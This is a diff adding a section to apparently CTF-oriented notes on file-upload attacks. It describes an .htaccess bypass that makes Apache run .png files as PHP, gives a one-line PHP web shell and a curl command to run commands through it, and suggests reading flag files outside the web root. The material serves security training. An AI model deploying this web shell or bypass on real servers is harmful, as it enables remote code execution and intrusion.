@@ -79,6 +79,31 @@ if "uploaded" in r.text.lower():
 - Always check the `upload` response carefully; it might output the random name it renamed your file to.
 - Look out for `.htaccess` upload exploits to change directory configs and enable custom file extensions.
 
+## .htaccess-to-PHP (Apache upload bypass)
+When the upload filter is a **blocklist** of only `.php`-ish extensions (`.php`, `.phtml`, `.phps`,
+`.php5`) rather than a strict allowlist of images, and it permits a file named `.htaccess`:
+
+1. Upload a `.htaccess` containing one of:
+   ```
+   AddType application/x-httpd-php .png
+   # or
+   <FilesMatch "\.png$">
+   SetHandler application/x-httpd-php
+   </FilesMatch>
+   ```
+2. Upload PHP code named with the allowed extension (e.g. `shell.png`):
+   ```php
+   <?php system($_GET['c']); ?>
+   ```
+3. Request it: `curl 'http://target/images/shell.png?c=cmd'`.
+
+Key signals / workflow:
+- Probe the filter FIRST: upload test files named `.txt`, `.php`, `.png`, `.phtml`, `.htaccess` and
+  read the accept/reject responses to learn the rule (blocklist vs allowlist) and allowed extensions.
+- No magic-byte/Content-Type validation needed here (server handler, not mime-type, now runs PHP).
+- `SetHandler` is more reliable than `AddType` on Apache with php-fpm/mod_php variants.
+- Read flags outside the web root: `../../flag.txt` (e.g. `ls ../..`, `cat ../../flag.txt`).
+
 ## References
 - OWASP: Unrestricted File Upload
 - HackTricks: File Upload
